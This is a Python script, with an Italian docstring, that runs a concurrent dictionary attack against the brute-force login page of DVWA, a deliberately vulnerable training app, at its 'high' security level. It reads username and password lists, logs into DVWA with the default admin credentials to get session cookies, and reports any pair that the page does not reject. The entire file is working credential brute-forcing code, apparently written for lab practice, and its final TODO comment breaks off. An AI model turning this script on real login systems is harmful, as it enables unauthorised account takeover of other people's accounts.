'''
Attacco dizionario contro DVWA livello sicurezza 'high'
'''

# asynchronous requests
import asyncio
# multiple arguments to asyncio
import functools
# requests to get new PHPSESSID
import requests
# exit program when combination found
# DOES NOT WORK
from sys import exit
# measure how long it takes to complete the program
from time import time
# arguments from command line
import argparse

parser  = argparse.ArgumentParser()
parser.add_argument('target_ip')
parser.add_argument('-us', '--users_file')
parser.add_argument('-pw', '--passwords_file')
parser.add_argument('-P', '--protocol')
args    = parser.parse_args()

if (args.users_file == None): args.users_file = 'usernames.txt'
if (args.passwords_file == None): args.passwords_file = 'passwords.txt'
if (args.protocol == None): args.protocol = 'http'

users       = []
passwords   = []

with open(args.users_file, 'r') as users_file:
    users = users_file.read().splitlines()

with open(args.passwords_file, 'r') as passwords_file:
    passwords = passwords_file.read().splitlines()

url_cookies = {}

count = 0

for user in users:
    for password in passwords:
        url = ''
        url += args.protocol + '://'
        url += args.target_ip
        url += '/dvwa/vulnerabilities/brute/'
        url += '?username=' + user
        url += '&password=' + password
        url += '&Login=Login'
        url_cookies[url] = {}

futures     = []
responses   = []

starting_time   = 0

def get_dvwa_cookies():
    dvwa_login = {'username': 'admin', 'password': 'password', 'Login':'Login'}
    for url in url_cookies.keys():
        with requests.Session() as session:
       	    with session.post('http://192.168.1.167/dvwa/login.php', data=dvwa_login) as req:
                url_cookies[url] = session.cookies.get_dict()

async def main():
    global loop, count

    for url in url_cookies.keys():
        futures.append(loop.run_in_executor(None, functools.partial(requests.get, url, cookies=url_cookies[url])))

    for future in futures:
        response    = await future
        # print currently tested username-password combination
        print(str(time() - starting_time) + '\tTrying: user=' + response.url.split('username=')[1].split('&')[0] + '\tpassword=' + response.url.split('password=')[1].split('&')[0])
        count       += 1
        if (b'incorrect' not in response.content):
            print('NUMBER OF RESPONSES RECEIVED: ' + str(count))
            print(response.url)
            # print correct username-password combination
            print(response.url.split('username=')[1].split('&')[0], response.url.split('password=')[1].split('&')[0]) 
            # print how long it took to find such combination ever since the program was launched
            print("TOTAL TIME: " + str(time() - starting_time))

if (__name__ == '__main__'):
    print("Using " + args.users_file + " as user list.")
    print("Using " + args.passwords_file + " as password list.")
    get_dvwa_cookies()
    loop = asyncio.get_event_loop()
    starting_time = time()
    loop.run_until_complete(main())
    # print how long it takes from the program to finish running (it doesn't stop once a right combination was found)
    print(time() - starting_time)

# TODO: as of now only 
